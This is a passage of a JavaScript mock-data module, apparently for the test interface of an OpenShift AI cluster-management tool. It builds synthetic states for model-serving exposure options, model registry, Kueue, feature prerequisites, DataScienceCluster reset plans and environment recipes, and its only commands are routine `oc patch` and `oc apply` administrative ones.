  const chat = MODEL_CATALOG.find((c) => c.name === model)?.type !== "embedding";
  const gwUsable = !!gw?.deployed && !!gw.ready;
  const listed = (gw?.allowedProjects ?? []).includes(project);
  const address = `${INFERENCE}/${project}/${model}`;
  const def = {
    key: "default-gateway", exposure: "default-gateway", title: "Through the cluster's default inference gateway",
    description: `Reachable from outside the cluster at ${gwUsable ? address : `https://inference.<apps domain>/${project}/${model}`}. Each call needs an OpenShift token that can see ${project}.`,
    available: gwUsable, address: gwUsable ? address : undefined,
    reason: gwUsable ? undefined : "The inference gateway isn't set up yet. Set it up below, or choose another way.",
    fix: gwUsable ? undefined : "inference-gateway",
    changes: gwUsable && gw.managedByTool && !listed ? [`Gateway ${GW_KEY} (this tool's): ${project} is added to the projects it allows. Anyone who can edit ${project} can then attach routes to this shared gateway.`] : undefined,
    needsAuth: gwUsable && !authReady ? true : undefined,
  };
  const maas = {
    key: "maas", exposure: "maas", gatewayRef: "openshift-ingress/maas-default-gateway", title: "Through MaaS only",
    description: "Published to Models as a Service: anyone signed in to the cluster can call it with a MaaS API key, within their subscription's token limit. The dashboard's playground lists it as a MaaS model.",
    available: chat && maasReady, address: maasReady ? `https://maas.${APPS}` : undefined,
    reason: !chat ? "Only chat models are published to MaaS." : maasReady ? undefined : "MaaS isn't set up yet (Red Hat Connectivity Link is missing).",
    fix: chat && !maasReady ? "maas-tab" : undefined,
    changes: chat && maasReady ? [`Gateway openshift-ingress/maas-default-gateway: admits routes from ${project}.`, `Published to MaaS: MaaSModelRef ${model} in ${project}, and this tool's subscription and authorization policy list the model.`] : undefined,
  };
  // Non-ingress gateway: selectable but never the default recommendation (opaque token policy).
  const other = otherGateway ? [{
    key: "gateway:team-gateways/shared-llm", exposure: "gateway", gatewayRef: "team-gateways/shared-llm", title: "Through another gateway: team-gateways/shared-llm",
    description: "Uses a gateway someone else runs; this tool doesn't change it. RHOAI adds token checks.",
    available: true, address: `https://shared-llm.${APPS}/${project}/${model}`,
  }] : [];
  const internal = {
    key: "internal", exposure: "internal", title: "Only inside the cluster", available: true,
    description: "No outside address. Programs on this cluster (for example a workbench) can call it without a token.",
    warning: "Calls to the in-cluster address are not authenticated: any pod on the cluster whose network can reach the project can use the model.",
  };
  const options = [def, maas, ...other, internal];
  const chosen = def.available ? def : maas.available ? maas : undefined;
  return {
    project, model, kserveDefaultGateway: GW_KEY, authReady, options,
    default: chosen?.key ?? "",
    defaultReason: chosen === def ? "works from your laptop with an OpenShift token, the way the dashboard deploys models."
      : chosen === maas ? "MaaS is set up and the inference gateway can't be used: callers use a MaaS API key." : undefined,
    recommendGateway: !def.available,
    recommendGatewayReason: def.available ? undefined : "Set up the inference gateway to reach models from outside the cluster with an OpenShift token, as the dashboard does.",
  };
}

/** ModelState routing overlay from pkg/cluster addModelRouting plus synthetic call check. */
export const routed = (m, { exposure = "default-gateway", check = "ok" } = {}) => ({
  ...m, exposure, servedName: m.name,
  gateway: exposure === "internal" ? undefined : exposure === "maas" ? "openshift-ingress/maas-default-gateway" : GW_KEY,
  gatewayAuth: exposure === "internal" ? undefined : exposure === "maas" ? "maas" : "enforced",
  // Matches live RHOAI 3.6: in-cluster path via gateway Service, else workload Service :8000.
  internalUrl: exposure === "internal" ? `https://${m.name}-kserve-workload-svc.${m.namespace}.svc.cluster.local:8000`
    : exposure === "maas" ? `https://maas-default-gateway-openshift-default.openshift-ingress.svc.cluster.local/${m.namespace}/${m.name}`
      : `https://openshift-ai-inference-openshift-ai-inference.openshift-ingress.svc.cluster.local/${m.namespace}/${m.name}`,
  url: exposure === "internal" ? undefined : m.url,
  callCheck: check === "ok" ? { result: "ok", ok: true, status: 200, message: exposure === "internal" ? `A chat request for "${m.name}" was answered (HTTP 200).` : `A chat request for "${m.name}" was answered (HTTP 200). A request without a token was refused (HTTP 401).`, url: `${m.url}/v1/chat/completions`, at: "2026-11-18T18:04:12Z" }
    : check === "unauthenticated" ? { result: "unauthenticated", ok: false, status: 200, message: `The model also answered a request without a token (HTTP 200): gateway ${GW_KEY} does not check who calls, so anyone who can reach ${m.url} can use the model. Check that RHOAI's AuthPolicy on the gateway is enforced (odh-model-controller and Red Hat Connectivity Link run), and that the gateway is not labelled opendatahub.io/managed=false.`, url: `${m.url}/v1/chat/completions`, at: "2026-11-18T18:04:12Z" }
    : check === "model-name" ? { result: "model-name", ok: false, status: 404, message: `The model's server answered 404: it does not serve a model named "Qwen/Qwen2.5-0.5B-Instruct". A request must send "model": "${m.name}", the name the model was set up with (not its display name or its Hugging Face id).`, at: "2026-11-18T18:04:12Z" }
      : check === "route" ? { result: "route", ok: false, status: 404, message: `No answer at ${m.url}/v1/chat/completions (404, empty body): the gateway didn't route the request to the model. Right after setup the gateway can take a minute to load the route; check again shortly.`, at: "2026-11-18T18:04:12Z" }
        : undefined,
});

// --- Model registry (GET /api/resources/model-registry, modelregistry.ReadStatus) ---

const REGISTRY_BASE = { name: "nightly-registry", namespace: "rhoai-model-registries", component: "aiHub", dashboardUrl: DASHBOARD_URL };
const REGISTRY_SAMPLE = { model: "qwen25-05b-instruct", version: "v1", uri: "hf://Qwen/Qwen2.5-0.5B-Instruct:7ae557604adf67be50417f59c2c2f167def9a775" };

/** This tool's model registry, one state each. */
export const modelRegistryStates = {
  absent: { ...REGISTRY_BASE, state: "absent" },
  starting: { ...REGISTRY_BASE, state: "starting", managedByTool: true, message: "Deployment nightly-registry-postgres is progressing: waiting for the database to be available" },
  ready: {
    ...REGISTRY_BASE, state: "ready", managedByTool: true, address: `${DASHBOARD_URL}/model-registry/nightly-registry`,
    sample: { ...REGISTRY_SAMPLE, registered: true, complete: true, state: "LIVE", id: "1" },
  },
  readyNoSample: {
    ...REGISTRY_BASE, state: "ready", managedByTool: true, address: `${DASHBOARD_URL}/model-registry/nightly-registry`,
    sample: { ...REGISTRY_SAMPLE, registered: false },
  },
  terminating: { ...REGISTRY_BASE, state: "terminating", managedByTool: true, message: "Being deleted." },
};

/** The Distributed workloads tab (GET /api/resources/kueue): Kueue on the cluster, the tool's setup in states. */
export const KUEUE_IMAGE = "quay.io/modh/ray:2.47.1-py311-cu121";
export function kueueWorld(state = "none", { optIn = false, samples = false, project = "dev-project" } = {}) {
  const set = state === "ready";
  const obj = (kind, name, namespace) => ({ kind, name, ...(namespace ? { namespace } : {}), present: set, ...(set ? { managedByTool: true, active: true } : {}) });
  const missing = state === "operator-missing";
  return {
    project: state === "none" || missing ? undefined : project,
    instance: missing ? { found: false, available: false, v1beta2: false, ready: false } : { found: true, available: true, kueueReady: "True", v1beta2: true, ready: true },
    ...(missing ? { refusal: "Set up its prerequisites first (above): Kueue is turned off on this cluster.", refusalCode: "prerequisites",
      blocked: { component: "kueue", dsc: "default-dsc", state: "Removed", reason: "Kueue component is turned off on this cluster: component kueue is Removed in DataScienceCluster default-dsc, so nothing would run it. A cluster-admin turns it on by setting it to Unmanaged." } } : {}),
    objects: missing ? [] : [obj("ResourceFlavor", "nightly-kueue-cpu"), obj("ClusterQueue", "nightly-kueue"), obj("LocalQueue", "nightly-kueue", project)],
    quota: "14 CPUs, 44Gi of memory and 12Gi of ephemeral storage",
    ...(set ? { label: { present: true, addedByTool: true } } : {}),
    samples: [
      samples ? { kind: "raycluster", name: "nightly-raycluster", present: true, managedByTool: true, image: KUEUE_IMAGE, state: "Running", rayState: "ready" } : { kind: "raycluster", name: "nightly-raycluster", present: false },
      samples ? { kind: "rayjob", name: "nightly-rayjob", present: true, managedByTool: true, image: KUEUE_IMAGE, state: "Admitted", rayState: "Running" } : { kind: "rayjob", name: "nightly-rayjob", present: false },
    ],
    optIn: optIn
      ? { disableKueue: false, setByTool: true, previous: "unset", on: true, profile: { kind: "HardwareProfile", name: "nightly-kueue-cpu", namespace: "redhat-ods-applications", present: true, managedByTool: true, active: true } }
      : { profile: { kind: "HardwareProfile", name: "nightly-kueue-cpu", namespace: "redhat-ods-applications", present: false } },
    defaultRayImage: KUEUE_IMAGE,
    dashboardUrl: DASHBOARD_URL,
    // Every queue on the cluster (pkg/cluster/internal/kueue Users): the tool's while it is set up.
    queues: set ? ["ClusterQueue nightly-kueue", `LocalQueue ${project}/nightly-kueue`] : [],
  };
}

/** Feature prerequisite matrix for GET /api/resources/prerequisites. */
export function prerequisites({ models = "ready", pipelines = "ready", registryRestorable = false, kueue = "ready", exposure = "" } = {}) {
  const readyPart = (id, title, message) => ({ id, title, state: "ready", message, notManaged: true });
  const ready = (parts) => ({ ready: true, parts });
  const missingModels = {
    ready: false,
    parts: [
      { id: "dsc-kserve", title: "Model serving (KServe)", state: "missing", message: "Removed in DataScienceCluster default-dsc. Set up sets it to Managed; Clean up can turn it back.", commands: `oc patch datasciencecluster default-dsc --type=merge -p '{"spec":{"components":{"kserve":{"managementState":"Managed"}}}}'` },
      { id: "cert-manager", title: "cert-manager Operator for Red Hat OpenShift", state: "missing", message: "Not installed. Set up installs version 1.20.1 from redhat-operators (channel stable-v1).", commands: "oc apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: cert-manager-operator\nEOF" },
      ...(models === "missing-routing" ? [
        { id: "rhcl", title: "Red Hat Connectivity Link", state: "missing", message: "Not installed. Set up installs version 1.4.4 from redhat-operators (channel stable)." },
        { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", state: "missing", message: "Not created yet. Set up creates it once Connectivity Link serves its API; it starts Authorino, which checks each call's token." },
      ] : []),
      { id: "dependencies", title: "KServe's dependency check", state: "waiting", message: "Waits for cert-manager: KServe reports it isn't installed. Set up installs it, then waits until KServe sees it." },
    ],
    setupPlan: [
      "DataScienceCluster default-dsc: set kserve to Managed (it is Removed; Clean up can turn it back while nothing else uses it)",
      "Install cert-manager Operator for Red Hat OpenShift 1.20.1: Namespace cert-manager-operator, OperatorGroup cert-manager-operator, Subscription cert-manager-operator/openshift-cert-manager-operator (package openshift-cert-manager-operator, channel stable-v1, from redhat-operators, automatic updates); it stays after Clean up, as other features share it",
      ...(models === "missing-routing" ? [
        "Install Red Hat Connectivity Link 1.4.4: Namespace kuadrant-system, OperatorGroup kuadrant-operator-group, Subscription kuadrant-system/kuadrant-operator (package rhcl-operator, channel stable, from redhat-operators, automatic updates); it stays after Clean up, as other features share it",
        "Create the Kuadrant CR kuadrant-system/kuadrant (as the MaaS docs do); it stays after Clean up, as other features share it",
      ] : []),
    ],
  };
  const missingPipelines = {
    ready: false,
    parts: [{ id: "dsc-aipipelines", title: "Data Science Pipelines (aipipelines)", state: "missing", message: "Removed in DataScienceCluster default-dsc. Set up sets it to Managed; Clean up can turn it back.", commands: `oc patch datasciencecluster default-dsc --type=merge -p '{"spec":{"components":{"aipipelines":{"managementState":"Managed"}}}}'` }],
    setupPlan: ["DataScienceCluster default-dsc: set aipipelines to Managed (it is Removed; Clean up can turn it back while nothing else uses it)"],
  };
  return {
    modelsExposure: exposure,
    features: {
      pipelines: pipelines === "missing" ? missingPipelines : ready([readyPart("dsc-aipipelines", "Data Science Pipelines (aipipelines)", "Managed in DataScienceCluster default-dsc")]),
      mlflow: ready([readyPart("dsc-mlflowoperator", "MLflow (mlflowoperator)", "Managed in DataScienceCluster default-dsc")]),
      models: models === "ready" ? ready([readyPart("dsc-kserve", "Model serving (KServe)", "Managed in DataScienceCluster default-dsc"), readyPart("cert-manager", "cert-manager Operator for Red Hat OpenShift", "Version 1.20.1 runs in cert-manager-operator")]) : missingModels,
      playground: ready([readyPart("dsc-ogx", "Gen AI playground (ogx)", "Managed in DataScienceCluster default-dsc")]),
      kueue: kueue === "missing"
        ? {
          ready: false,
          parts: [
            readyPart("cert-manager", "cert-manager Operator for Red Hat OpenShift", "Version 1.20.1 runs in cert-manager-operator"),
            { id: "kueue-operator", title: "Red Hat build of Kueue", state: "missing", message: "Not installed. Set up installs version 1.5.1 from redhat-operators (channel stable-v1.5)." },
            { id: "dsc-kueue", title: "Kueue component", state: "missing", message: "Removed in DataScienceCluster default-dsc. Set up sets it to Unmanaged, which means RHOAI uses the Kueue operator you install instead of its own; Clean up can turn it back.", commands: `oc patch datasciencecluster default-dsc --type=merge -p '{"spec":{"components":{"kueue":{"managementState":"Unmanaged"}}}}'` },
          ],
          setupPlan: [
            "Install Red Hat build of Kueue 1.5.1: Namespace openshift-kueue-operator, OperatorGroup openshift-kueue-operator, Subscription openshift-kueue-operator/kueue-operator (package kueue-operator, channel stable-v1.5, from redhat-operators, automatic updates); it stays after Clean up, as other features share it",
            "DataScienceCluster default-dsc: set kueue to Unmanaged (it is Removed; Clean up can turn it back while nothing else uses it)",
          ],
        }
        : { ready: true, parts: [readyPart("cert-manager", "cert-manager Operator for Red Hat OpenShift", "Version 1.20.1 runs in cert-manager-operator"), readyPart("kueue-operator", "Red Hat build of Kueue", "Version 1.5.1 runs in openshift-kueue-operator"), { id: "dsc-kueue", title: "Kueue component", state: "ready", message: "Unmanaged in DataScienceCluster default-dsc (turned on by this tool)", managedByTool: true }], restorable: [{ component: "kueue", previous: "Removed", feature: "kueue" }] },
      "model-registry": registryRestorable
        ? { ready: true, parts: [{ id: "dsc-aiHub", title: "Model registry (aiHub)", state: "ready", message: "Managed in DataScienceCluster default-dsc (turned on by this tool)", managedByTool: true }], restorable: [{ component: "aiHub", previous: "Removed", feature: "model-registry" }] }
        : ready([readyPart("dsc-aiHub", "Model registry (aiHub)", "Managed in DataScienceCluster default-dsc")]),
    },
  };
}

// --- DataScienceCluster manager UI (GET /api/components/dsc) --------------------
// CRD v3 tree for RHOAI 3.6 with live DSC values plus CSV alm-examples defaults
// (pkg/cluster/testdata/dsc).
const MR = ["Managed", "Removed"];
const dscTree = [
  // Tuple: path, spec (null unset; undefined grouping), CSV default, CRD default, allowed, actual, condition
  ["aigateway", "Managed", "Removed", "", MR, "Managed", ["AIGatewayReady", "True"]],
  ["aigateway.aiGrid", null, null, "", MR, "Removed", ["AIGridReady", "False", "Removed"]],
  ["aigateway.batchGateway", "Removed", "Removed", "", MR, "Removed", ["BatchGatewayReady", "False", "Removed"]],
  ["aigateway.modelsAsAService", "Managed", "Removed", "Removed", MR, "Managed", ["ModelsAsAServiceReady", "True"]],
  ["aiHub", "Managed", "Managed", "", MR, "Managed", ["AIHubReady", "True"]],
  ["aipipelines", "Managed", "Managed", "", MR, "Managed", ["AIPipelinesReady", "True"]],
  ["aipipelines.argoWorkflowsControllers", null, null, "Managed", MR, "", null],
  ["dashboard", undefined, undefined, "", null, "Managed", ["DashboardReady", "True"]],
  ["dashboard.maasPortal", "Removed", "Removed", "", MR, "Removed", ["MaaSPortalAvailable", "False", "Removed"]],
  ["dashboard.standard", "Managed", "Managed", "", MR, "", null],
  ["data", undefined, undefined, "", null, "Managed", ["DataReady", "True"]],
  ["data.dataRegistry", null, null, "", MR, "", null],
  ["data.featureStore", "Managed", "Managed", "", MR, "", null],
  ["databaseservice", "Removed", "Removed", "", MR, "Removed", ["DatabaseServiceReady", "False", "Removed"]],
  ["kserve", "Managed", "Managed", "", MR, "Managed", ["KserveReady", "True"]],
  ["kserve.modelCache", null, null, "Removed", MR, "", null],
  ["kserve.modelExpress", "Removed", "Removed", "Removed", MR, "", null],
  ["kserve.nim", "Managed", "Managed", "Managed", MR, "", null],
  ["kueue", "Removed", "Removed", "", ["Managed", "Unmanaged", "Removed"], "Removed", ["KueueReady", "False", "Removed"]],
  ["mcplifecycleoperator", "Managed", "Managed", "", MR, "Managed", ["MCPLifecycleOperatorReady", "True"]],
  ["mlflowoperator", "Managed", "Managed", "", MR, "Managed", ["MLflowOperatorReady", "True"]],
  ["ogx", "Managed", "Managed", "", MR, "Managed", ["OGXReady", "True"]],
  ["ray", "Managed", "Managed", "", MR, "Managed", ["RayReady", "True"]],
  ["sparkoperator", "Removed", "Removed", "", MR, "Removed", ["SparkOperatorReady", "False", "Removed"]],
  ["trainer", "Managed", "Managed", "", MR, "Managed", ["TrainerReady", "True"]],
  ["trustyai", "Managed", "Managed", "", MR, "Managed", ["TrustyAIReady", "True"]],
  ["workbenches", "Managed", "Managed", "", MR, "Managed", ["WorkbenchesReady", "True"]],
  ["workbenches.workbenchesV2", "Removed", "Removed", "Removed", MR, "Removed", ["WorkbenchesV2Ready", "False", "Removed"]],
];

/**
 * Build DSC manager graph. overrides pins spec values (null means omitted).
 * Mismatch detection mirrors production: unset toggles vs CSV defaults and
 * Managed children under non-Managed parents. unknown injects CRD-extraneous
 * fields beneath nearest ancestors; noDefault skips CSV exemplar defaults.
 */
export function dscManager(overrides = {}, { unknown = {}, noDefault = false, hardResetBlocked = false } = {}) {
  const nodes = dscTree.map(([path, s, def, schemaDefault, allowed, actual, cond]) => {
    const parts = path.split(".");
    const toggle = s !== undefined;
    const value = toggle ? (path in overrides ? overrides[path] : s) : null;
    // After reconciliation, a Removed spec surfaces actual Removed even if CSV still Managed.
    if (toggle && value !== "Managed" && actual === "Managed") {
      actual = "Removed";
      cond = cond && [cond[0], "False", "Removed"];
    }
    if (noDefault) def = null;
    const n = {
      path, name: parts[parts.length - 1], parent: parts.slice(0, -1).join("."), depth: parts.length - 1, toggle,
      specSet: value !== null && value !== undefined, defaultSet: def !== null && def !== undefined,
      ...(allowed ? { allowed } : {}), ...(schemaDefault ? { schemaDefault } : {}),
      ...(value ? { spec: value } : {}), ...(def ? { default: def } : {}), ...(actual ? { actual } : {}),
      ...(cond ? { condition: { type: cond[0], status: cond[1], ...(cond[2] ? { reason: cond[2], message: `ManagementState is set to ${cond[2]}` } : {}) } } : {}),
    };
    if (n.specSet && !noDefault) n.changed = n.spec !== (n.defaultSet ? n.default : schemaDefault || "Removed");
    return n;
  });
  const byPath = Object.fromEntries(nodes.map((n) => [n.path, n]));
  const mismatches = [];
  for (const n of nodes) {
    if (!n.toggle) continue;
    if (!n.specSet && n.defaultSet) {
      mismatches.push({ kind: "unset", path: n.path, default: n.default, fixable: true, message: n.default === "Removed"
        ? "Not set in the DataScienceCluster, so the operator treats it as Removed, which is also the release default. Fix sets it explicitly."
        : `Not set in the DataScienceCluster, so the operator treats it as Removed, but the release default is ${n.default}. Fix sets it to ${n.default}.` });
    }
    const parent = byPath[n.parent];
    if (n.spec === "Managed" && parent?.toggle && parent.spec !== "Managed") {
      mismatches.push({ kind: "parent-removed", path: n.path, parent: parent.path, fixable: false,
        message: `Managed, but ${parent.path} is ${parent.spec || "not set"}, so the operator deploys nothing for it. Set ${parent.path} to Managed, or set this to Removed.` });
    }
  }
  // Unknown schema fields become sorted mismatch rows inserted after their parent
  // node (pkg/cluster withUnknownNodes).
  for (const path of Object.keys(unknown).sort()) {
    mismatches.push({ kind: "unknown-field", path, fixable: true, message: "The installed CRD does not define this field, so the operator never sees it. Fix removes it." });
    const parts = path.split(".");
    let parent;
    for (let i = parts.length - 1; i >= 1 && !parent; i--) parent = byPath[parts.slice(0, i).join(".")];
    const row = { path, name: parent ? path.slice(parent.path.length + 1) : path, parent: parent?.path ?? "", depth: parent ? parent.depth + 1 : 0, toggle: false, specSet: false, defaultSet: false, unknown: true };
    let at = nodes.length;
    if (parent) {
      at = nodes.indexOf(parent) + 1;
      while (at < nodes.length && nodes[at].path.startsWith(`${parent.path}.`)) at++;
    }
    nodes.splice(at, 0, row);
  }
  const components = nodes.filter((n) => n.depth === 0 && !n.unknown).map((n) => n.path);
  // Top-level component counts as present when it or any descendant has spec.
  const inDSC = components.filter((c) => nodes.some((n) => (n.path === c || n.path.startsWith(`${c}.`)) && n.specSet));
  const byName = (a, b) => (a < b ? -1 : a > b ? 1 : 0);
  // unknownValues + hardResetBlocked ride on dscPlan Fix and match live guardrails;
  // non-enumerable extras omitted from JSON payloads.
  return Object.defineProperties({
    exists: true, state: "present", name: "default-dsc", uid: "ba54ddbf-ad4a-4257-9ab4-977eb541dc1c", apiVersion: "datasciencecluster.opendatahub.io/v3", storageVersion: "v3",
    dscCount: 1, phase: "Ready", releaseName: "OpenShift AI Self-Managed", releaseVersion: "3.6.0", operatorVersion: "3.6.0",
    ...(noDefault
      ? { defaultsError: "The installed operator 3.6.0 ships no DataScienceCluster v3 example in its CSV's alm-examples, so there is no release default to compare with." }
      : { defaultsSource: "alm-examples of the installed CSV rhods-operator.3.6.0" }),
    conditions: [{ type: "Ready", status: "True" }, { type: "ProvisioningSucceeded", status: "True" }, { type: "ComponentsReady", status: "True" }, { type: "ModulesReady", status: "True" }],
    nodes, mismatches,
    comparison: {
      defaultsRead: !noDefault, schemaRead: true, ...(noDefault ? {} : { defaultsCSV: "rhods-operator.3.6.0" }),
      crdComponents: [...components].sort(byName),
      defaultComponents: noDefault ? [] : [...components].sort(byName),
      dscComponents: [...inDSC, ...Object.keys(unknown).filter((p) => !p.includes("."))].sort(byName),
    },
  }, {
    unknownValues: { value: Object.fromEntries(Object.entries(unknown).map(([p, v]) => [p, typeof v === "string" ? v : JSON.stringify(v)])) },
    hardResetBlocked: { value: hardResetBlocked },
  });
}

// Plan token placeholder (hashed server-side in prod); mock accepts any value.
const DSC_PLAN_BINDING = "0".repeat(24);

// Mock DSC encodes active MaaS usage—published model plus tool subscription/policy—
// matching dsc_maas_guard.go expectations on real clusters.
const DSC_MAAS_IN_USE = "MaaS is in use (published model dev-project/qwen25-05b-instruct; subscription models-as-a-service/rhoai-nightly-updater-subscription; access policy models-as-a-service/rhoai-nightly-updater-access; set up by this tool on the MaaS tab).";

/** Planned DSC mutation preview (GET /api/components/dsc/plan) against manager m. */
export function dscPlan(m, action, path, to, withParent, keepEnabled = false) {
  const base = { action, name: m.name, uid: m.uid, apiVersion: m.apiVersion, token: DSC_PLAN_BINDING, changes: [] };
  const node = m.nodes.find((n) => n.path === path);
  const change = (n, value) => ({ path: n.path, from: n.spec, fromSet: n.specSet, to: value, toSet: true, toggle: true,
    effect: value === "Managed" && n.spec !== "Managed" ? "deploys" : value !== "Managed" && n.spec === "Managed" ? "removes" : "" });
  const maasBlock = (p) => ({ component: p, reasons: [`${DSC_MAAS_IN_USE} Removing ${p} takes MaaS away: maas-api and the gateway's policies go, so every published model and every API key stops working. Remove MaaS on the MaaS tab first (Clean up MaaS unpublishes and removes it in order), or keep ${p} Managed`] });
  if (action === "toggle" && node) {
    const parent = m.nodes.find((n) => n.path === node.parent);
    if (to === "Managed" && parent?.toggle && parent.spec !== "Managed") {
      if (!withParent) return { ...base, refusal: `${parent.path} is ${parent.spec || "not set"}, so setting ${path} to Managed would deploy nothing. Set ${parent.path} to Managed in the same change, or set it first.`, code: "parent_removed", parentPath: parent.path };
      return { ...base, changes: [change(parent, "Managed"), change(node, "Managed")] };
    }
    const changes = [change(node, to)];
    if (to !== "Managed") {
      for (const c of m.nodes.filter((n) => n.parent === path && n.spec === "Managed")) changes.push({ path: c.path, from: "Managed", fromSet: true, to: "Managed", toSet: true, toggle: true, effect: "removes" });
    }
    const takesMaaS = to !== "Managed" && node.spec === "Managed" && ["aigateway", "aigateway.modelsAsAService"].includes(path);
    return { ...base, changes, ...(takesMaaS ? { blocked: [maasBlock(path)] } : {}) };
  }
  if (action === "fix") {
    return { ...base, changes: [
      ...m.mismatches.filter((x) => x.kind === "unset").map((x) => ({ path: x.path, fromSet: false, to: x.default, toSet: true, toggle: true, effect: x.default === "Managed" ? "deploys" : "" })),
      // Unknown-field removal entry formatted like backend diffFields JSON.
      ...m.mismatches.filter((x) => x.kind === "unknown-field").map((x) => ({ path: x.path, from: m.unknownValues?.[x.path] ?? "", fromSet: true, toSet: false, toggle: false })),
    ] };
  }
  // During resets, keepEnabled preserves user-enabled components that CSV defaults
  // would turn off.
  const byPath = Object.fromEntries(m.nodes.map((n) => [n.path, n]));
  const deployed = (n) => (n.spec === "Managed" || n.spec === "Unmanaged") && (!byPath[n.parent]?.toggle || byPath[n.parent].spec === "Managed");
  const turnedOn = m.nodes.filter((n) => n.toggle && n.specSet && deployed(n) && (n.default || n.schemaDefault || "Removed") === "Removed").map((n) => n.path);
  const kept = keepEnabled ? turnedOn : [];
  const differing = m.nodes.filter((n) => n.toggle && n.defaultSet && n.spec !== n.default && !kept.includes(n.path)).map((n) => change(n, n.default));
  const takesMaaS = differing.some((c) => c.path === "aigateway" && c.effect === "removes");
  const reset = { ...base, keepEnabled, turnedOn, kept, ...(takesMaaS ? { blocked: [maasBlock("aigateway")] } : {}) };
  if (action === "soft-reset" && differing.length === 0 && kept.length > 0) {
    return { ...reset, refusal: `The DataScienceCluster already matches the release default, apart from the components you turned on, which the reset keeps (${kept.join(", ")}). Nothing to change.`, code: "nothing_to_do" };
  }
  const protectedFields = ["aiHub.instancesNamespace", "workbenches.workbenchNamespace"];
  if (action === "soft-reset") return { ...reset, changes: differing, protectedFields };
  // Captured prod scenario (RHOAI 3.6.0, 2026-11-19): unchecked operators and in-use
  // MLflow trip hard reset (pkg/cluster removalBlocks).
  const blocked = m.hardResetBlocked ? [
    { component: "aigateway", reasons: [DSC_UNKNOWN_OPERATOR] },
    { component: "mcplifecycleoperator", reasons: [DSC_UNKNOWN_OPERATOR] },
    { component: "mlflowoperator", reasons: ["in use by MLflow mlflow, so its removal would hang; delete MLflow first (Environment page)"] },
  ] : reset.blocked;
  return {
    ...reset, changes: differing, protectedFields, ...(blocked ? { blocked } : {}),
    tornDown: m.nodes.filter((n) => n.depth === 0 && (n.toggle ? n.spec === "Managed" : n.actual === "Managed")).map((n) => n.path),
    stayRemoved: differing.filter((c) => c.effect === "removes").map((c) => c.path),
    deleteTimeoutSeconds: 600,
    stopsWorking: [
      ...(kept.includes("aigateway") ? [
        { resource: "published model dev-project/qwen25-05b-instruct", components: ["aigateway"] },
        { resource: "every MaaS API key", components: ["aigateway"] },
      ] : []),
      { resource: "pipeline server dev-project/dspa", components: ["aipipelines"] },
      { resource: "LLMInferenceService dev-project/qwen25-05b-instruct", components: ["kserve"] },
      { resource: "playground server dev-project/lsd-genai-playground", components: ["dashboard", "ogx"] },
    ],
    conversionCRDs: [
      { crd: "guardrailsorchestrators.trustyai.opendatahub.io", component: "trustyai" },
      { crd: "trustyaiservices.trustyai.opendatahub.io", component: "trustyai" },
    ],
    // newObject shows API-server view with CRD defaulting applied.
    newObject: `apiVersion: datasciencecluster.opendatahub.io/v3\nkind: DataScienceCluster\nmetadata:\n  labels:\n    app.kubernetes.io/name: datasciencecluster\n  name: default-dsc\nspec:\n  components:\n    aiHub:\n      instancesNamespace: rhoai-model-registries\n      managementState: Managed\n    aigateway:\n      managementState: ${kept.includes("aigateway") ? "Managed" : "Removed"}\n    ...\n    kserve:\n      managementState: Managed\n      nim:\n        airGapped: false\n        managementState: Managed\n      rawDeploymentServiceConfig: Headless\n    kueue:\n      autoCreateQueues: false\n      defaultClusterQueueName: default\n      defaultLocalQueueName: default\n      managementState: Removed\n    ...\n`,
  };
}

// Message fragment when operator ownership is uncertain (pkg/cluster unknownOperatorBlocker).
const DSC_UNKNOWN_OPERATOR = "can't confirm its operator is running to clean up, so the tool won't remove it. Check in the OpenShift console, then change it there";

// --- Environment recipes (pkg/types RecipePlan, RecipeRunStatus) ------------------

/** Canonical dev recipe exposing MVP features inside a spawned project. */
export const recipe = () => ({
  apiVersion: "rhoai-nightly-updater/v1alpha1", kind: "EnvironmentRecipe", metadata: { name: "dev" },
  spec: {
    rhoai: { build: "latest", ifInstalled: "keep" }, dataScienceCluster: { create: true },
    project: { mode: "create", name: "recipe-dev", displayName: "Recipe dev" },
    features: { pipelines: { enabled: true }, mlflow: { enabled: true }, models: { enabled: false }, playground: { enabled: false }, maas: { enabled: false } },
    dashboardDev: { deploy: "none", flavor: "rhoai" },
  },
});

/** A recipe with every feature (recipes phase 2), in project recipe-full. */
export const fullRecipe = () => ({
  apiVersion: "rhoai-nightly-updater/v1alpha1", kind: "EnvironmentRecipe", metadata: { name: "full" },
  spec: {
    rhoai: { build: "latest", ifInstalled: "keep" }, dataScienceCluster: { create: true },
    project: { mode: "create", name: "recipe-full", displayName: "Recipe full" },
    features: {
      pipelines: { enabled: true }, mlflow: { enabled: true, samples: true },
      models: { enabled: true, model: "qwen3-1-7b", exposure: "default-gateway" }, playground: { enabled: true },
      maas: { enabled: true, database: "development", publish: true }, modelRegistry: { enabled: true, sample: true }, workbench: { enabled: true },
      kueue: { enabled: true, rayCluster: true },
    },
    dashboardDev: { deploy: "pr", pr: 4321, flavor: "rhoai" },
  },
});

/**
 * A recipe's steps as the runner lists them (pkg/cluster internal/recipe
 * Steps): id, title, typical and max seconds, in the runner's order.
 */
/** The catalog's display names (pkg/cluster internal/serving ModelCatalog), which the model step's title uses. */
const MODEL_NAMES = { "qwen25-05b-instruct": "Qwen2.5 0.5B Instruct (CPU)", "qwen3-1-7b": "Qwen3 1.7B (CPU, tool calling)", "smollm2-135m-instruct": "SmolLM2 135M Instruct (CPU)" };

export function recipeSteps(rcp = recipe()) {
  const sp = rcp.spec;
  const f = sp.features;
  const out = [["rhoai", "RHOAI", 420, 900], ["dsc", "DataScienceCluster", 60, 420]];
  if (sp.project) out.push(["project", `Project ${sp.project.name}`, 10, 60]);
  // One step sets up what every feature needs (pkg/cluster internal/recipe prereqItems).
  if (f.pipelines?.enabled || f.mlflow?.enabled || f.models?.enabled || f.playground?.enabled || f.modelRegistry?.enabled || f.kueue?.enabled) {
    out.push(["prerequisites", "What the features need", 300, 900]);
  }
  if (f.pipelines?.enabled) out.push(["s3", "S3 storage", 60, 300], ["pipeline-server", "Pipeline server", 120, 600]);
  if (f.mlflow?.enabled) out.push(["mlflow", "MLflow", 120, 600]);
  if (f.mlflow?.enabled && f.mlflow.samples) out.push(["mlflow-samples", "MLflow samples", 60, 900]);
  if (f.maas?.enabled) out.push(["maas", "Models as a Service", 600, 900]);
  if (f.models?.enabled) {
    if (!f.models.exposure) out.push(["models-prereq", "What the model's access needs", f.maas?.enabled ? 60 : 240, 900]);
